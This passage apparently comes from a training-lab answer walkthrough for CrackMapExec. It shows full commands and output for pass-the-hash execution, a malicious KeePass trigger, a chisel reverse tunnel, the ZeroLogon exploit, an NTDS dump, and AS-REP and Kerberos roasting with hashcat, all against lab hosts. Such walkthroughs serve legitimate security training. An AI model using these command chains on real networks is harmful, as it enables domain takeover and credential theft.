└──╼ [★]$ proxychains4 -q crackmapexec winrm 172.16.1.10 -u soti -H 1bc3af33d22c1c2baec10a32db22c72d -x "more c:\users\soti\desktop\flag.txt"

SMB         172.16.1.10     5985   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:inlanefreight.htb)
HTTP        172.16.1.10     5985   DC01             [*] http://172.16.1.10:5985/wsman
WINRM       172.16.1.10     5985   DC01             [+] inlanefreight.htb\soti:1bc3af33d22c1c2baec10a32db22c72d (Pwn3d!)
WINRM       172.16.1.10     5985   DC01             [+] Executed command
WINRM       172.16.1.10     5985   DC01             P4%$_tH3_hash_with_S0t1
```

Answer: `P4%$_tH3_hash_with_S0t1`

# Getting sessions in a C2 Framework

## Question 1

### "Repeat the examples in the section, and mark DONE when finished."

Students should repeat the steps in the "Getting sessions in a C2 Framework" section. Once they have successfully used `CrackMapExec` to obtain C2 sessions with both Empire and `Metasploit's` `web_delivery`, they need to type `DONE`.

Answer: `DONE`

# Bloodhound Integration

## Question 1

### "Repeat the examples in the section, and mark DONE when finished."

Students are encouraged to repeat the steps in the "Bloodhound Integration" section then type `Done`.

Answer: `DONE`

# Popular Modules

## Question 1

### "What's the IP of the DNS entry dc02?"

Students need to target `ldap`, authenticating at `julio:Password` while utilizing the `get-network` module:

Code: shell

```shell
crackmapexec ldap dc01.inlanefreight.htb -u julio -p Password1 -M get-network -o ALL=true
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-ojzelcmay7]─[~/CrackMapExec]
└──╼ [★]$ crackmapexec ldap dc01.inlanefreight.htb -u julio -p Password1 -M get-network -o ALL=true

SMB         inlanefreight.htb 445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
LDAP        inlanefreight.htb 389    DC01             [+] inlanefreight.htb\julio:Password1 (Pwn3d!)
GET-NETW... inlanefreight.htb 389    DC01             [*] Querying zone for records
GET-NETW... inlanefreight.htb 389    DC01             [*] Using System DNS to resolve unknown entries. Make sure resolving your target domain works here or specify an IP as target host to use that server for queries
GET-NETW... inlanefreight.htb 389    DC01             Found 4 records
GET-NETW... inlanefreight.htb 389    DC01             [+] Dumped 4 records to /home/htb-ac594497/.cme/logs/inlanefreight.htb_network_2023-01-16_183701.log
```

Useful information about the network can be found in the dumped log files:

Code: shell

```shell
cat /home/htb-ac594497/.cme/logs/inlanefreight.htb_network_2023-01-16_183701.log
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-ojzelcmay7]─[~/CrackMapExec]
└──╼ [★]$ cat /home/htb-ac594497/.cme/logs/inlanefreight.htb_network_2023-01-16_183701.log

test.inlanefreight.htb 	 172.16.1.39
database01.inlanefreight.htb 	 172.16.1.29
dc02.inlanefreight.htb 	 172.16.1.9
MS01.inlanefreight.htb 	 172.16.1.5
```

Students will find the IP `172.16.1.9` associated with the dc02 entry.

Answer: `172.16.1.9`

# Popular Modules

## Question 2

### "Use keepass\_discover module to identify a another configuration file. Uses the path that has "Roaming" as the answer."

Students need to target smb, authenticating as `julio:Password1` while utilizing the `keepass_discover` module:

Code: shell

```shell
crackmapexec smb STMIP -u julio -p Password1 -M keepass_discover
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-ojzelcmay7]─[~/CrackMapExec]
└──╼ [★]$ crackmapexec smb 10.129.204.177 -u julio -p Password1 -M keepass_discover

SMB         10.129.204.177  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         10.129.204.177  445    DC01             [+] inlanefreight.htb\julio:Password1 (Pwn3d!)
KEEPASS_... 10.129.204.177  445    DC01             Found process "KeePass" with PID 6240 (user INLANEFREIGHT\david)
KEEPASS_... 10.129.204.177  445    DC01             Found C:\Users\david\AppData\Roaming\KeePass\KeePass.config.xml
KEEPASS_... 10.129.204.177  445    DC01             Found C:\Users\david\Application Data\KeePass\KeePass.config.xml
KEEPASS_... 10.129.204.177  445    DC01             Found C:\Users\david\Documents\David-Database.kdbx
KEEPASS_... 10.129.204.177  445    DC01             Found C:\Users\david\My Documents\David-Database.kdbx
KEEPASS_... 10.129.204.177  445    DC01             Found C:\Users\julio\AppData\Roaming\KeePass\KeePass.config.xml
KEEPASS_... 10.129.204.177  445    DC01             Found C:\Users\julio\Application Data\KeePass\KeePass.config.xml
KEEPASS_... 10.129.204.177  445    DC01             Found C:\Users\julio\Documents\Database.kdbx
KEEPASS_... 10.129.204.177  445    DC01             Found C:\Users\julio\My Documents\Database.kdbx
```

Students will find the path `C:\Users\david\AppData\Roaming\KeePass\KeePass.config.xml`.

Answer: `C:\Users\david\AppData\Roaming\KeePass\KeePass.config.xml`

# Popular Modules

## Question 3

### "What's the password you found in the KeePass database file?"

Students need to target smb, authenticating as `julio:Password1` and using the `keepass_trigger` module to read the configuration file that was discovered previously:

Code: shell

```shell
crackmapexec smb STMIP -u julio -p Password1 -M keepass_trigger -o ACTION=ALL KEEPASS_CONFIG_PATH=C:/Users/david/AppData/Roaming/KeePass/KeePass.config.xml
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-ojzelcmay7]─[~/CrackMapExec]
└──╼ [★]$ crackmapexec smb 10.129.204.177 -u julio -p Password1 -M keepass_trigger -o ACTION=ALL KEEPASS_CONFIG_PATH=C:/Users/david/AppData/Roaming/KeePass/KeePass.config.xml

[!] Module is not opsec safe, are you sure you want to run this? [Y/n] Y
SMB         10.129.204.177  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         10.129.204.177  445    DC01             [+] inlanefreight.htb\julio:Password1 (Pwn3d!)
KEEPASS_... 10.129.204.177  445    DC01             
KEEPASS_... 10.129.204.177  445    DC01             [*] Adding trigger "export_database" to "C:/Users/david/AppData/Roaming/KeePass/KeePass.config.xml"
KEEPASS_... 10.129.204.177  445    DC01             [+] Malicious trigger successfully added, you can now wait for KeePass reload and poll the exported files
KEEPASS_... 10.129.204.177  445    DC01             
KEEPASS_... 10.129.204.177  445    DC01             [*] Restarting INLANEFREIGHT\david's KeePass process
KEEPASS_... 10.129.204.177  445    DC01             [*] Polling for database export every 5 seconds, please be patient
KEEPASS_... 10.129.204.177  445    DC01             [*] we need to wait for the target to enter his master password ! Press CTRL+C to abort and use clean option to cleanup everything
....
KEEPASS_... 10.129.204.177  445    DC01             [+] Found database export !
KEEPASS_... 10.129.204.177  445    DC01             [+] Moved remote "C:\Users\Public\export.xml" to local "/tmp/export.xml"
KEEPASS_... 10.129.204.177  445    DC01             
KEEPASS_... 10.129.204.177  445    DC01             [*] Cleaning everything..
KEEPASS_... 10.129.204.177  445    DC01             [*] No export found in C:\Users\Public , everything is cleaned
KEEPASS_... 10.129.204.177  445    DC01             [*] Found trigger "export_database" in configuration file, removing
KEEPASS_... 10.129.204.177  445    DC01             [*] Restarting INLANEFREIGHT\david's KeePass process
KEEPASS_... 10.129.204.177  445    DC01             
KEEPASS_... 10.129.204.177  445    DC01             [*] Extracting password..

<SNIP>
```

It's possible for the tool to error out with python3 error messages. However, students can still find the password in the export.xml file that is still generated by CME:

Code: shell

```shell
cat /tmp/export.xml | grep -i protectinmemory -A 5
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-ojzelcmay7]─[~/CrackMapExec]
└──╼ [★]$ cat /tmp/export.xml | grep -i protectinmemory -A 5

							<Value ProtectInMemory="True">S3creTSuperP@ssword</Value>
						</String>
						<String>
							<Key>Title</Key>
							<Value>flag</Value>
						</String>
```

The password is shown to be `S3creTSuperP@ssword`.

Answer: `S3creTSuperP@ssword`

# Vulnerability Scan Modules

## Question 1

### "Connect to target IP and get the flag located in the Administrator's desktop."

Students need to target smb, using local authentication to connect as `Administrator:IpreferanewP@$$` while executing a command to read the flag.txt file:

Code: shell

```shell
crackmapexec smb STMIP -u Administrator -p 'IpreferanewP@$$' -x "more C:\Users\Administrator\desktop\flag.txt" --local-auth
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-ojzelcmay7]─[~/CrackMapExec]
└──╼ [★]$ crackmapexec smb 10.129.204.146 -u Administrator -p 'IpreferanewP@$$' -x "more C:\Users\Administrator\desktop\flag.txt" --local-auth

SMB         10.129.204.146  445    WS01             [*] Windows Server 2016 Standard 14393 x64 (name:WS01) (domain:WS01) (signing:False) (SMBv1:True)
SMB         10.129.204.146  445    WS01             [+] WS01\Administrator:IpreferanewP@$$ (Pwn3d!)
SMB         10.129.204.146  445    WS01             [+] Executed command 
SMB         10.129.204.146  445    WS01             N0w_W3_N33d_Pr0x7Ch41n$
```

The flag reads `N0w_W3_N33d_Pr0x7Ch41n$`.

Answer: `N0w_W3_N33d_Pr0x7Ch41n$`

# Vulnerability Scan Modules

## Question 2

### "Attempt to exploit one of the vulnerabilities and get the flag located on the Domain Controller Administrator's desktop."

Students need to first download and execute chisel as a server from their attack host:

Code: shell

```shell
wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz -O chisel.gz -q
gunzip -d chisel.gz 
chmod +x chisel
./chisel server --reverse
```

```
┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-ojzelcmay7]─[~/CrackMapExec]
└──╼ [★]$ wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz -O chisel.gz -q
┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-ojzelcmay7]─[~/CrackMapExec]
└──╼ [★]$ gunzip -d chisel.gz 
┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-ojzelcmay7]─[~/CrackMapExec]
└──╼ [★]$ chmod +x chisel 
┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-ojzelcmay7]─[~/CrackMapExec]
└──╼ [★]$ ./chisel server --reverse
2023/01/16 19:36:49 server: Reverse tunnelling enabled
2023/01/16 19:36:49 server: Fingerprint zT8LOvO8c8hLT61xJGachfmqR9R6JwYvzSsqttx/1Is=
2023/01/16 19:36:49 server: Listening on http://0.0.0.0:8080
```

Next, `chisel` needs to be downloaded and then transferred to the target machine:

Code: shell

```shell
crackmapexec smb STMIP -u Administrator -p 'IpreferanewP@$$' --put-file ./chisel.exe \\Windows\\Temp\\chisel.exe --local-auth
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-ojzelcmay7]─[~/CrackMapExec]
└──╼ [★]$ crackmapexec smb 10.129.204.146 -u Administrator -p 'IpreferanewP@$$' --put-file ./chisel.exe \\Windows\\Temp\\chisel.exe --local-auth
SMB         10.129.204.146  445    WS01             [*] Windows Server 2016 Standard 14393 x64 (name:WS01) (domain:WS01) (signing:False) (SMBv1:True)
SMB         10.129.204.146  445    WS01             [+] WS01\Administrator:IpreferanewP@$$ (Pwn3d!)
SMB         10.129.204.146  445    WS01             [*] Copy ./chisel.exe to \Windows\Temp\chisel.exe

[*] completed: 100.00% (1/1)
SMB         10.129.204.146  445    WS01             [+] Created file ./chisel.exe on \\C$\\Windows\Temp\chisel.exe
```

Now, `chisel` can be run on the target machine:

Code: shell

```shell
crackmapexec smb STMIP -u Administrator -p 'IpreferanewP@$$' -x "C:\Windows\Temp\chisel.exe client PWNIP:8080 R:socks" --local-auth
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-ojzelcmay7]─[~/CrackMapExec]
└──╼ [★]$ crackmapexec smb 10.129.204.146 -u Administrator -p 'IpreferanewP@$$' -x "C:\Windows\Temp\chisel.exe client 10.10.15.68:8080 R:socks" --local-auth

SMB         10.129.204.146  445    WS01             [*] Windows Server 2016 Standard 14393 x64 (name:WS01) (domain:WS01) (signing:False) (SMBv1:True)
SMB         10.129.204.146  445    WS01             [+] WS01\Administrator:IpreferanewP@$$ (Pwn3d!)

[*] completed: 100.00% (1/1)
```

Students need to then add the socks5 proxy to their proxychains.conf file:

```
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
#socks4 	127.0.0.1 9050
socks5 127.0.0.1 1080
```

ZeroLogon must be used against the internal domain controller:

Code: shell

```shell
git clone https://github.com/dirkjanm/CVE-2020-1472 -q
cd CVE-2020-1472/
proxychains4 -q python3 cve-2020-1472-exploit.py dc01 172.16.10.3
proxychains4 -q crackmapexec smb 172.16.10.3 -u 'DC01$' -p '' --ntds
```

```
┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-ojzelcmay7]─[~/CrackMapExec]
└──╼ [★]$ git clone https://github.com/dirkjanm/CVE-2020-1472 -q
┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-ojzelcmay7]─[~/CrackMapExec]
└──╼ [★]$ cd CVE-2020-1472/
┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-ojzelcmay7]─[~/CrackMapExec/CVE-2020-1472]
└──╼ [★]$ proxychains4 -q python3 cve-2020-1472-exploit.py dc01 172.16.10.3
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
Performing authentication attempts...
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.10.3:135  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.10.3:49671  ...  OK
=================================================================================================================================================
Target vulnerable, changing account password to empty string

Result: 0

Exploit complete!
```

Subsequently, students need to authenticate with SMB using an empty password:

Code: shell

```shell
proxychains crackmapexec smb 172.16.10.3 -u 'DC01$' -p '' --ntds
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-ojzelcmay7]─[~/CrackMapExec]
└──╼ [★]$ proxychains crackmapexec smb 172.16.10.3 -u 'DC01$' -p '' --ntds

[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.10.3:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.10.3:135  ...  OK
SMB         172.16.10.3     445    DC01             [*] Windows Server 2016 Standard 14393 x64 (name:DC01) (domain:INLANEFREIGHT.HTB) (signing:True) (SMBv1:True)
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.10.3:445  ...  OK
SMB         172.16.10.3     445    DC01             [+] INLANEFREIGHT.HTB\DC01$: 
SMB         172.16.10.3     445    DC01             [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
SMB         172.16.10.3     445    DC01             [+] Dumping the NTDS, this could take a while so go grab a redbull...
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.10.3:135  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.10.3:49666  ...  OK
SMB         172.16.10.3     445    DC01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:f36ccfe434490cddc644901973d9a344:::
```

Finally, students can use the administrator to hash to read the flag:

Code: shell

```shell
proxychains crackmapexec smb 172.16.10.3 -u administrator -H f36ccfe434490cddc644901973d9a344 -x "more C:\users\administrator\desktop\flag.txt"
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-ojzelcmay7]─[~/CrackMapExec]
└──╼ [★]$ proxychains crackmapexec smb 172.16.10.3 -u administrator -H f36ccfe434490cddc644901973d9a344 -x "more C:\users\administrator\desktop\flag.txt"

[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.10.3:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.10.3:135  ...  OK
SMB         172.16.10.3     445    DC01             [*] Windows Server 2016 Standard 14393 x64 (name:DC01) (domain:INLANEFREIGHT.HTB) (signing:True) (SMBv1:True)
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.10.3:445  ...  OK
SMB         172.16.10.3     445    DC01             [+] INLANEFREIGHT.HTB\administrator:f36ccfe434490cddc644901973d9a344 (Pwn3d!)
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.10.3:135  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.10.3:49668  ...  OK
SMB         172.16.10.3     445    DC01             [+] Executed command 
SMB         172.16.10.3     445    DC01             CME_Vuln3rabil1tY_$C4Nn3r
```

The flag reads `CME_Vuln3rabil1tY_$C4Nn3r`.

Answer: `CME_Vuln3rabil1tY_$C4Nn3r`

# Creating Our Own CME Module

## Question 1

### "Repeat the examples in the section, and mark DONE when finished."

Students should repeat the examples in the `Creating Our Own CME Module` section then type `Done`.

Answer: `DONE`

# Creating Our Own CME Module

## Question 2

### "Try to create a new module based on this, to create a new user and add that user to any group. The module should optionally receive the group name, or by default, it will add the user to the administrator's group. Mark DONE when finished."

Students are encouraged to create a new module using the criteria provided in the question, then type `Done` when finished.

Answer: `DONE`

# Additional CME Functionality

## Question 1

### "Repeat the examples in the section, and mark DONE when finished."

Students are highly encouraged to repeat the examples in the `Additional CME Functionality` section then type `Done` once the tasks are complete.

Answer: `DONE`

# Kerberos Authentication

## Question 1

### "Repeat the examples in the section, and mark DONE when finished."

Students need to repeat the examples in the `Kerberos Authentication` section, then type `Done` when complete.

Answer: `DONE`

# Mastering CMEDB

## Question 1

### "Repeat the examples in the section, and mark DONE when finished."

Students should repeat the examples in the `Mastering CMEDB` section then type `Done`.

Answer: `DONE`

# Skills Assessment

## Question 1

### "What's the password of the account you found?

Students first need to connect to the target `chisel` server, allowing communication to the internal network:

Code: shell

```shell
sudo chisel client STMIP:8080 socks
```

```
┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-lprrymfzrm]─[~]
└──╼ [★]$ sudo chisel client 10.129.204.182:8080 socks

2023/01/17 19:18:29 client: Connecting to ws://10.129.204.182:8080
2023/01/17 19:18:29 client: tun: proxy#127.0.0.1:1080=>socks: Listening
2023/01/17 19:18:30 client: Connected (Latency 96.073864ms)
```

Also, the proxychains.conf file must be configured for socks proxy:

```
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
#socks4 	127.0.0.1 9050
socks5 127.0.0.1 1080
```

Next, students need to utilize a NULL authentication to enumerate domain users:

Code: shell

```shell
proxychains4 -q crackmapexec smb 172.16.15.3 -u '' -p '' --rid-brute 6000 > users.txt
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-lprrymfzrm]─[~/CrackMapExec]
└──╼ [★]$ proxychains4 -q crackmapexec smb 172.16.15.3 -u '' -p '' --rid-brute 6000 > users.txt

|S-chain|-<>-127.0.0.1:1080-<><>-172.16.15.3:445-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.15.3:445-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.15.3:135-<><>-OK
<SNIP>
```

The users.txt file needs to be formatted:

Code: shell

```shell
cat users.txt | grep SidTypeUser | cut -d "\\" -f 2 | cut -d " " -f 1 | grep -v \\$ > skusers.txt
```

```
┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-lprrymfzrm]─[~/CrackMapExec]
└──╼ [★]$ cat users.txt | grep SidTypeUser | cut -d "\\" -f 2 | cut -d " " -f 1 | grep -v \\$ > skusers.txt
```

Students will now ASREPRoast the list of users, attempting to steal the password hash for any user that does not require Kerbreros Pre Authentication:

Code: shell

```shell
proxychains4 -q crackmapexec ldap dc01.inlanefreight.local -u skusers.txt -p '' --asreproast skasreproast.out
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-lprrymfzrm]─[~/CrackMapExec]
└──╼ [★]$ proxychains4 -q crackmapexec ldap dc01.inlanefreight.local -u skusers.txt -p '' --asreproast skasreproast.out
SMB         dc01.inlanefreight.local 445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)

[*] completed: 100.00% (1/1)

[*] completed: 100.00% (1/1)

[*] completed: 100.00% (1/1)

[*] completed: 100.00% (1/1)
LDAP        dc01.inlanefreight.local 445    DC01             $krb5asrep$23$Juliette@INLANEFREIGHT.LOCAL:4f46e03e741fcc35301fc30062f77a5a$9876573c8151ff5ca5b4f76ff2ee46103cc9b62b978adc9a44acd8cc8014dc088ca2c3aad709ef5ee548ecdb0c85eb46307712d52a4f3803db87497cd3cf1dd8fbd14b6e24b718dc1005868d052362d2390ece8e3f140c13a6f2f9a3c41a4b3a0e7aafe115fe7fd44c76249a8c34ef577220692a4535ca33024bb80f12cbf3fb6549568f975e68f8a5ce0c23add000a169f7e81d0baa147b62c33870f0c6749d68b2c4390a9d32d2ef5c1391bff57c3ff472cdf5a72e4d1e9c7f868f3292d69068fad0db7258e273056e39932169aef457dce635af6897836464481e7762b929f9973607ba0f233b4f708c8eff16b2607eaf2d823cdd8157cf46
```

The output will contain a password hash, which needs to be cracked with hashcat:

Code: shell

```shell
hashcat -m 18200 skasreproast.out /usr/share/wordlists/rockyou.txt --force
```

```
┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-lprrymfzrm]─[~/CrackMapExec]
└──╼ [★]$ hashcat -m 18200 skasreproast.out /usr/share/wordlists/rockyou.txt --force

hashcat (v6.1.1) starting...

$krb5asrep$23$Juliette@INLANEFREIGHT.LOCAL:4f46e03e741fcc35301fc30062f77a5a$9876573c8151ff5ca5b4f76ff2ee46103cc9b62b978adc9a44acd8cc8014dc088ca2c3aad709ef5ee548ecdb0c85eb46307712d52a4f3803db87497cd3cf1dd8fbd14b6e24b718dc1005868d052362d2390ece8e3f140c13a6f2f9a3c41a4b3a0e7aafe115fe7fd44c76249a8c34ef577220692a4535ca33024bb80f12cbf3fb6549568f975e68f8a5ce0c23add000a169f7e81d0baa147b62c33870f0c6749d68b2c4390a9d32d2ef5c1391bff57c3ff472cdf5a72e4d1e9c7f868f3292d69068fad0db7258e273056e39932169aef457dce635af6897836464481e7762b929f9973607ba0f233b4f708c8eff16b2607eaf2d823cdd8157cf46:Password1
```

The password for `Juliette` is shown to be `Password1`.

Answer: `Password1`

# Skills Assessment

## Question 2

### "Gain access to the SQL01 and submit the contents of the flag located in C:\\Users\\Public\\flag.txt."

Now that students have a valid domain account they can quickly find kerberoastable users (Note how only the name of the domain controller is passed as a command line argument; there is no IP or hostname):

Code: shell

```shell
proxychains4 -q crackmapexec ldap dc01 -u Juliette -p Password1 --kerberoasting skkerberoasting.out
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-lprrymfzrm]─[~/CrackMapExec]
└──╼ [★]$ proxychains4 -q crackmapexec ldap dc01 -u Juliette -p Password1 --kerberoasting skkerberoasting.out

SMB         dc01            445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
LDAP        dc01            389    DC01             [+] INLANEFREIGHT.LOCAL\Juliette:Password1 
LDAP        dc01            389    DC01             [*] Total of records returned 1
CRITICAL:impacket:CCache file is not found. Skipping...
LDAP        dc01            389    DC01             sAMAccountName: Atul memberOf:  pwdLastSet: 2022-12-08 18:09:06.588127 lastLogon:2022-12-14 11:45:37.482056
LDAP        dc01            389    DC01             $krb5tgs$23$*Atul$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/Atul*$e5980399058c523d5f3d7713519b203d$c352eef2ccb716d753e1d71732e0741e6ccc9122b36f3087a031e8ee3de88c0b1a10e8f5fae48273a48df912cb6653bd334a27a2a19c6c8efda5d6e2b5cc831e5c9dbb3d37a1ba33dcf1d2920333d7d63038ca2f5546d1fb1fbec976601b3b5cf6406a108ce8591a3f76344e2c90b3b9a6a6c10095784b9ed6049c1a0ff8592710acd069f36de79fdd6a0678d2f73e8ea8cdfa04c2787a737681e01857beb4b82ce18d2f921d49f6f27e44a7ce7f2242db1a4b8f9fadf753ac964f77796e4b080d8753713e47673f431d5c2246cb6111d45fd69c76ccf3b7630bf9ef21bc6fa1024987719318a20c21e4e2f93c14b9afaca0cc6452ed1e3b5b253330ccfebd4ec29ef60f53e602b3b212f7c928e6c31d05e549a6c2a2ed0563190ecc0e7c4a39099923eacee8bff4e955efc1055db68a4a0261009593637cc0eaf6d3456593963ec058b15f4479733a01c464435979a60a57eacbf823b2f4abe0edf6c76a000541f82af087f54d8c75f070bfa4739252934d1986f5d87c7461a9468cb392d3329d1ce1c398a79da371719b78a045d61c9bbf35f1466a1f151181ce4a01f91adfa93a67a777c0db16d2f628ae5da1fed1cf4d00b9ab34568fd711274a03bb2c295d6a135a2ca9437c1a71fa00971001cf74727663a52bccfd89043f4053bd2a3636cf4e7a7ccfaa04d07764294f4e2501e556d8d82812416d43c637ff324ceb0e88dd523ed5b4c0e9bbce47832087bbe46c9c6e3183ad3ff4ad34ba8ecf891ce745c009cb4a89101c2813564f2c2a9475f0ca10194f8a13d9629e63b5e7e6f10d8d9afc1dbe1dca3114f0d89d2fe9ef1c2ede0164d8386cf01f80fd5c9ded7d76f0b2ae9b292e13dceac191ae95892c4cb173ef75fd58633b5bd1454fb948af37079e1c43155de84425890fcc071a7a211be11f1bc4a1de68fa48d862b53309e0685f6fc1c9ae80707e897c1631caa3772b54858f964c3e7c819a8632746453bd085aa5babc71dc34e53dbd504a2a41b3990ee9dfb3a7f6f3e95619db8bffe854a09c23da6ea70702fd37882967f4c0a8592168d7a8c3c349e9e9565e9d032ef4833a8bc89e6a99191ceadf432f00d1a19315547da45d415b1f35a3915e5bdededa9bcb6fec7898c17422ca3c140d36d7b3868cdcc032846cf878a8d8ba913625e8ddb312e72ebd3e3985028bfcbad406db3f1b7974ff044099d76a559d01f0a7a3c1749e830df9ebf95c7356158d68688dc59906c1f85b077d416ee352d6b3d20b236c40037d5e16f7643b109d61672fcd2905506a3ac0a2290d482c4f90bba886b55f035d2b27029896e83cb8170ac5ff93c91fd32f6b51c0251b16262528be1ebb7ee4531c512e593ae0c14c7376f39ddef523394e150b67321ecf2d6954f47df045a055c900689afb71876a546f572d0ad52464c8de4f8a374d0b92af4ebec219d72aff620799889004229d0f957682d7d6cb9cd246a871a42b1793a1dd74786ed852f6a5b86572b2c6c39a30467b1f171645fbead8bc83348be4
```

Revealing the password hash for `Atul`, students need to use `Hashcat` to find the plain text password:

Code: shell

```shell
hashcat -m 13100 skkerberoasting.out /usr/share/wordlists/rockyou.txt --force
```

```
┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-lprrymfzrm]─[~/CrackMapExec]
└──╼ [★]$ hashcat -m 13100 skkerberoasting.out /usr/share/wordlists/rockyou.txt --force

hashcat (v6.1.1) starting...

$krb5tgs$23$*Atul$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/Atul*$e5980399058c523d5f3d7713519b203d$c352eef2ccb716d753e1d71732e0741e6ccc9122b36f3087a031e8ee3de88c0b1a10e8f5fae48273a48df912cb6653bd334a27a2a19c6c8efda5d6e2b5cc831e5c9dbb3d37a1ba33dcf1d2920333d7d63038ca2f5546d1fb1fbec976601b3b5cf6406a108ce8591a3f76344e2c90b3b9a6a6c10095784b9ed6049c1a0ff8592710acd069f36de79fdd6a0678d2f73e8ea8cdfa04c2787a737681e01857beb4b82ce18d2f921d49f6f27e44a7ce7f2242db1a4b8f9fadf753ac964f77796e4b080d8753713e47673f431d5c2246cb6111d45fd69c76ccf3b7630bf9ef21bc6fa1024987719318a20c21e4e2f93c14b9afaca0cc6452ed1e3b5b253330ccfebd4ec29ef60f53e602b3b212f7c928e6c31d05e549a6c2a2ed0563190ecc0e7c4a39099923eacee8bff4e955efc1055db68a4a0261009593637cc0eaf6d3456593963ec058b15f4479733a01c464435979a60a57eacbf823b2f4abe0edf6c76a000541f82af087f54d8c75f070bfa4739252934d1986f5d87c7461a9468cb392d3329d1ce1c398a79da371719b78a045d61c9bbf35f1466a1f151181ce4a01f91adfa93a67a777c0db16d2f628ae5da1fed1cf4d00b9ab34568fd711274a03bb2c295d6a135a2ca9437c1a71fa00971001cf74727663a52bccfd89043f4053bd2a3636cf4e7a7ccfaa04d07764294f4e2501e556d8d82812416d43c637ff324ceb0e88dd523ed5b4c0e9bbce47832087bbe46c9c6e3183ad3ff4ad34ba8ecf891ce745c009cb4a89101c2813564f2c2a9475f0ca10194f8a13d9629e63b5e7e6f10d8d9afc1dbe1dca3114f0d89d2fe9ef1c2ede0164d8386cf01f80fd5c9ded7d76f0b2ae9b292e13dceac191ae95892c4cb173ef75fd58633b5bd1454fb948af37079e1c43155de84425890fcc071a7a211be11f1bc4a1de68fa48d862b53309e0685f6fc1c9ae80707e897c1631caa3772b54858f964c3e7c819a8632746453bd085aa5babc71dc34e53dbd504a2a41b3990ee9dfb3a7f6f3e95619db8bffe854a09c23da6ea70702fd37882967f4c0a8592168d7a8c3c349e9e9565e9d032ef4833a8bc89e6a99191ceadf432f00d1a19315547da45d415b1f35a3915e5bdededa9bcb6fec7898c17422ca3c140d36d7b3868cdcc032846cf878a8d8ba913625e8ddb312e72ebd3e3985028bfcbad406db3f1b7974ff044099d76a559d01f0a7a3c1749e830df9ebf95c7356158d68688dc59906c1f85b077d416ee352d6b3d20b236c40037d5e16f7643b109d61